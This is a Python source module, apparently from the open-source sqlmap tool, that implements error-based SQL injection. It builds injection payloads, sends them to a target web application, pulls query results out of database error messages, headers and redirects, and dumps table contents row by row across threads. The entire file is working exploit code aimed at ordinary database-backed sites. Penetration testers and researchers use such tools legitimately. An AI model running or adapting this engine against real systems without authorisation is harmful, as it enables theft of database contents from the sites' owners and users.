#!/usr/bin/env python

"""
Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import extractRegexResult
from lib.core.common import getPartRun
from lib.core.common import getUnicode
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.convert import hexdecode
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import MSSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar

def _oneShotErrorUse(expression, field=None):
    offset = 1
    partialValue = None
    threadData = getCurrentThreadData()
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal and PARTIAL_VALUE_MARKER in retVal:
        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")
        logger.info("resuming partial value: '%s'" % _formatPartialContent(partialValue))
        offset += len(partialValue)

    threadData.resumed = retVal is not None and not partialValue

    if Backend.isDbms(DBMS.MYSQL):
        chunk_length = MYSQL_ERROR_CHUNK_LENGTH
    elif Backend.isDbms(DBMS.MSSQL):
        chunk_length = MSSQL_ERROR_CHUNK_LENGTH
    else:
        chunk_length = None

    if retVal is None or partialValue:
        try:
            while True:
                check = "%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
                trimcheck = "%s(?P<result>.*?)</" % (kb.chars.start)

                if field:
                    nulledCastedField = agent.nullAndCastField(field)

                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)) and not any(_ in field for _ in ("COUNT", "CASE")):  # skip chunking of scalar expression (unneeded)
                        extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(field), expression).group(0)
                        if extendedField != field:  # e.g. MIN(surname)
                            nulledCastedField = extendedField.replace(field, nulledCastedField)
                            field = extendedField
                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)

                # Forge the error-based SQL injection request
                vector = kb.injection.data[kb.technique].vector
                query = agent.prefixQuery(vector)
                query = agent.suffixQuery(query)
                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
                injExpression = unescaper.escape(injExpression)
                injExpression = query.replace("[QUERY]", injExpression)
                payload = agent.payload(newValue=injExpression)

                # Perform the request
                page, headers = Request.queryPage(payload, content=True, raise404=False)

                incrementCounter(kb.technique)

                # Parse the returned page to get the exact error-based
                # SQL injection output
                output = reduce(lambda x, y: x if x is not None else y, (\
                        extractRegexResult(check, page, re.DOTALL | re.IGNORECASE), \
                        extractRegexResult(check, listToStrValue(headers.headers \
                        if headers else None), re.DOTALL | re.IGNORECASE), \
                        extractRegexResult(check, threadData.lastRedirectMsg[1] \
                        if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                        threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)), \
                        None)

                if output is not None:
                    output = getUnicode(output)
                else:
                    trimmed = extractRegexResult(trimcheck, page, re.DOTALL | re.IGNORECASE) \
                        or extractRegexResult(trimcheck, listToStrValue(headers.headers \
                        if headers else None), re.DOTALL | re.IGNORECASE) \
                        or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] \
                        if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                        threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

                    if trimmed:
                        warnMsg = "possible server trimmed output detected "
                        warnMsg += "(due to its length and/or content): "
                        warnMsg += safecharencode(trimmed)
                        logger.warn(warnMsg)

                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):
                    if offset == 1:
                        retVal = output
                    else:
                        retVal += output if output else ''

                    if output and len(output) >= chunk_length:
                        offset += chunk_length
                    else:
                        break

                    if kb.fileReadMode and output:
                        dataToStdout(_formatPartialContent(output).replace(r"\n", "\n").replace(r"\t", "\t"))
                else:
                    retVal = output
                    break
        except:
            if retVal is not None:
                hashDBWrite(expression, "%s%s" % (retVal, PARTIAL_VALUE_MARKER))
            raise

        retVal = decodeHexValue(retVal) if conf.hexConvert else retVal

        if isinstance(retVal, basestring):
            retVal = htmlunescape(retVal).replace("<br>", "\n")

        retVal = _errorReplaceChars(retVal)

        if retVal is not None:
            hashDBWrite(expression, retVal)

    else:
        _ = "%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
        retVal = extractRegexResult(_, retVal, re.DOTALL | re.IGNORECASE) or retVal

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def _errorFields(expression, expressionFields, expressionFieldsList, num=None, emptyFields=None, suppressOutput=False):
    values = []
    origExpr = None

    threadData = getCurrentThreadData()

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = NULL if emptyFields and field in emptyFields else _oneShotErrorUse(expressionReplaced, field)

        if not kb.threadContinue:
            return None

        if not suppressOutput:
            if kb.fileReadMode and output and output.strip():
                print
            elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
                dataToStdout("[%s] [INFO] %s: %s\n" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", safecharencode(output)))

        if isinstance(num, int):
            expression = origExpr

        values.append(output)

    return values

def _errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.chars.space, " ").replace(kb.chars.dollar, "$").replace(kb.chars.at, "@").replace(kb.chars.hash_, "#")

    return retVal

def _formatPartialContent(value):
    """
    Prepares (possibly hex-encoded) partial content for safe console output
    """

    if value and isinstance(value, basestring):
        try:
            value = hexdecode(value)
        except:
            pass
        finally:
            value = safecharencode(value)

    return value

def errorUse(expression, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(kb.technique)

    abortedFlag = False
    count = None
    emptyFields = []
    start = time.time()
    startLimit = 0
    stopLimit = None
    value = None

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # Set kb.partRun in case the engine is called from the API
    kb.partRun = getPartRun(alias=False) if hasattr(conf, "api") else None

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry at a time
    # NOTE: we assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) \
       or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not \
       expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
       and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in expression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
            count = unArrayizeValue(_oneShotErrorUse(countedExpression, countedExpressionFields))

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            elif count and not count.isdigit():
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warn(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            if " ORDER BY " in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:
                message = "due to huge table size do you want to remove "
                message += "ORDER BY clause gaining speed over consistency? [y/N] "
                _ = readInput(message, default="N")

                if _ and _[0] in ("y", "Y"):
                    expression = expression[:expression.index(" ORDER BY ")]

            numThreads = min(conf.threads, (stopLimit - startLimit))

            threadData = getCurrentThreadData()
            threadData.shared.limits = iter(xrange(startLimit, stopLimit))
            threadData.shared.value = BigArray()
            threadData.shared.buffered = []
            threadData.shared.counter = 0
            threadData.shared.lastFlushed = startLimit - 1
            threadData.shared.showEta = conf.eta and (stopLimit - startLimit) > 1

            if threadData.shared.showEta:
                threadData.shared.progress = ProgressBar(maxValue=(stopLimit - startLimit))

            if kb.dumpTable and (len(expressionFieldsList) < (stopLimit - startLimit) > CHECK_ZERO_COLUMNS_THRESHOLD):
                for field in expressionFieldsList:
                    if _oneShotErrorUse("SELECT COUNT(%s) FROM %s" % (field, kb.dumpTable)) == '0':
                        emptyFields.append(field)
                        debugMsg = "column '%s' of table '%s' will not be " % (field, kb.dumpTable)
                        debugMsg += "dumped as it appears to be empty"
                        logger.debug(debugMsg)

            if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                kb.suppressResumeInfo = True
                debugMsg = "suppressing possible resume console info because of "
                debugMsg += "large number of rows. It might take too long"
                logger.debug(debugMsg)

            try:
                def errorThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.limit:
                            try:
                                valueStart = time.time()
                                threadData.shared.counter += 1
                                num = threadData.shared.limits.next()
                            except StopIteration:
                                break

                        output = _errorFields(expression, expressionFields, expressionFieldsList, num, emptyFields, threadData.shared.showEta)

                        if not kb.threadContinue:
                            break

                        if output and isListLike(output) and len(output) == 1:
                            output = output[0]

                        with kb.locks.value:
                            index = None
                            if threadData.shared.showEta:
                                threadData.shared.progress.progress(time.time() - valueStart, threadData.shared.counter)
                            for index in xrange(len(threadData.shared.buffered)):
                                if threadData.shared.buffered[index][0] >= num:
                                    break
                            threadData.shared.buffered.insert(index or 0, (num, output))
                            while threadData.shared.buffered and threadData.shared.lastFlushed + 1 == threadData.shared.buffered[0][0]:
                                threadData.shared.lastFlushed += 1
                                threadData.shared.value.append(threadData.shared.buffered[0][1])
                                del threadData.shared.buffered[0]

                runThreads(numThreads, errorThread)

            except KeyboardInterrupt:
                abortedFlag = True
                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            finally:
                threadData.shared.value.extend(_[1] for _ in sorted(threadData.shared.buffered))
                value = threadData.shared.value
                kb.suppressResumeInfo = False

    if not value and not abortedFlag:
        value = _errorFields(expression, expressionFields, expressionFieldsList)

    if value and isListLike(value) and len(value) == 1 and isinstance(value[0], basestring):
        value = value[0]

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %.2f seconds" % (kb.counters[kb.technique], duration)
        logger.debug(debugMsg)

    return value
